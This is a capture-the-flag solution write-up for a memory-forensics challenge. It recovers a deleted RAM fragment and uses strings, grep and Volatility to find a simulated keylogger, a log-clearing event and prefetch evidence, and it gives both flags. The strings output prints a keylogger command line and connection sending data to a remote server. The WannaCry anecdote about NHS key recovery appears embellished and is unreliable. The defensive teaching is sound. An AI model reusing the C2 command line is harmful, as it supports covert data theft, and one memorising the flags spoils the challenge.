---
tags: [ctf, solution, unit4, forensics, volatile, ram, strings, prefetch, event-logs]
challenge: "08 — RAM Knows Everything (ram_capture.bin)"
flag: "Cywarx{v0l4t1l3_k3y5_d1s4pp34r} and Cywarx{1102_ran_7_t1m3s}"
points: 300 + 225
difficulty: Hard
topic: Volatile Data & Memory Forensics + OS Artifacts
image: ctf1.img → P2 deleted file: ram_capture.bin
---

# 🧠 Challenge 08 — RAM Knows Everything

> [!success] Flags (two flags in one file!)
> - `Cywarx{v0l4t1l3_k3y5_d1s4pp34r}`
> - `Cywarx{1102_ran_7_t1m3s}`

> [!info] Real World Case — WannaCry (2017)
> When WannaCry infected NHS systems, investigators who captured RAM **before rebooting** found the RSA-2048 encryption keys still resident in memory. These keys decrypted patient data without paying ransom. Systems that were rebooted before RAM capture lost those keys permanently — patient data was irrecoverable. The 3-minute window between infection and reboot was the difference between recovery and total data loss.

---

## 📋 Challenge Summary

`ram_capture.bin` is a volatile memory fragment recovered from the suspect's machine. It contains **two flags**: the encryption key used by the keylogger process (volatile data), and evidence of anti-forensics via Windows Event Log clearing (EventID 1102 + Prefetch run count).

**Recovery target:** `ram_capture.bin` on P2 (inode 12)

---

## 🧠 Concept — Volatile vs Non-Volatile Data

```
NON-VOLATILE (survives power off):
  Hard drives, SSDs, USB drives
  Registry hives, Event logs
  Prefetch files (.pf)
  Pagefile.sys fragments
  Hiberfil.sys (hibernate dump)

VOLATILE (disappears on power off):
  RAM — running processes
  RAM — network connections
  RAM — encryption keys IN USE
  RAM — clipboard contents
  RAM — fileless malware (never touches disk)
  RAM — session tokens, passwords typed
```

> [!danger] Golden Rule
> **Capture RAM BEFORE powering off.** Once the machine is off, volatile evidence is gone forever. Tools: `winpmem`, `avml` (Linux), `LiME` (kernel module).

---

## 🔍 Method 1 — fls + icat + strings

### Step 1: Recover ram_capture.bin

```bash
fls -r -d -o 133120 ctf1.img
```

**Output:**
```
r/r * 12:  ram_capture.bin
```

```bash
icat -o 133120 ctf1.img 12 > ram_capture.bin
```

### Step 2: Extract all readable strings

```bash
strings ram_capture.bin
```

**Output:**
```
[PID 1337] keylogger.exe
[CmdLine] keylogger.exe --server=185.44.21.9:4444 --key=v0l4t1l3_k3y5_d1s4pp34r
[Network] 192.168.1.50:4444 --> 185.44.21.9:80  ESTABLISHED
[EventID 1102] Security log cleared by Rohan at 14:25:03
[EventID 4698] Scheduled task created: kl_autostart
[Prefetch] keylogger.exe ran 7 times last: 2024-03-17 14:22:33
[Prefetch] WinSCP.exe ran 3 times last: 2024-03-17 09:28:55
[RAM] key=v0l4t1l3_k3y5_d1s4pp34r
Flag: 1102_ran_7_t1m3s
```

### Step 3: Extract both flags

```bash
strings ram_capture.bin | grep "Flag\|key="
```

**Output:**
```
[CmdLine] keylogger.exe --server=185.44.21.9:4444 --key=v0l4t1l3_k3y5_d1s4pp34r
[RAM] key=v0l4t1l3_k3y5_d1s4pp34r
Flag: 1102_ran_7_t1m3s
```

> [!success] Flag 1: `Cywarx{v0l4t1l3_k3y5_d1s4pp34r}` (the RAM encryption key)
> [!success] Flag 2: `Cywarx{1102_ran_7_t1m3s}` (EventID 1102 + run count 7)

---

## 🔍 Method 2 — grep specific evidence

```bash
# Find the encryption key
strings ram_capture.bin | grep "key="

# Find EventID evidence
strings ram_capture.bin | grep -E "EventID|Prefetch|1102"

# Find network connections
strings ram_capture.bin | grep "ESTABLISHED"
```

---

## 🔍 Method 3 — strings on full image (no recovery needed)

```bash
strings ctf1.img | grep -E "v0l4t1l3|1102_ran|key="
```

---

## 🔍 Method 4 — Volatility3 (on a real RAM dump)

If this were a real Windows RAM dump (not our simulation):

```bash
# List processes
vol.py -f ram_capture.bin windows.pslist

# Get command line arguments
vol.py -f ram_capture.bin windows.cmdline

# Find network connections
vol.py -f ram_capture.bin windows.netscan

# Look for suspicious process
vol.py -f ram_capture.bin windows.pslist | grep -i keylogger
```

**Expected output:**
```
PID   PPID  Name             Offset             Create Time
----  ----  --------         ------             -----------
4     0     System           0x...              2024-03-17 08:00:01
892   440   cmd.exe          0x...              2024-03-17 09:14:55
1337  892   keylogger.exe    0x...              2024-03-17 09:22:33  ← SUSPICIOUS
```

---

## 🔬 Understanding EventID 1102

> [!warning] EventID 1102 — The Self-Defeating Cover-Up
> ```
> [EventID 1102] Security log cleared by Rohan at 14:25:03
> ```
> Rohan cleared the Security Event Log to hide his activity.
> But clearing the log **generates its own log entry** — EventID 1102.
> This entry cannot be deleted because it IS the deletion record.
> The act of covering tracks leaves its own permanent footprint.
>
> **Forensic significance:**
> - EventID 1102 = Security audit log cleared
> - Almost always indicates an attacker covering tracks
> - The clearance itself is evidence of consciousness of guilt

> [!note] Prefetch Evidence
> ```
> [Prefetch] keylogger.exe ran 7 times last: 2024-03-17 14:22:33
> ```
> Prefetch files prove execution even after the executable is deleted.
> Run count = 7 means the keylogger ran **7 separate times**.
> This directly contradicts any defence of "accidental single execution."
>
> Prefetch location: `C:\Windows\Prefetch\KEYLOGGER.EXE-A1B2C3D4.pf`

---

## 🔬 Key Concepts

> [!note] Hiberfil.sys as RAM Preservation
> If a suspect hibernates their laptop rather than shutting down, Windows writes the full RAM contents to `hiberfil.sys` on the hard drive. This file can be analysed with Volatility even after the machine is powered off — effectively converting volatile evidence into non-volatile evidence.

> [!note] Pagefile.sys
> Windows virtual memory (`pagefile.sys`) contains fragments of RAM paged to disk. Even without a full RAM dump, `strings pagefile.sys` often reveals process names, clipboard contents, and partial credentials.

---

## 🔗 Related Challenges
- [[CTF-05-NTFS-Timestomping]] — Windows NTFS artifacts
- [[CTF-09-Full-Investigation]] — Full case with all evidence combined
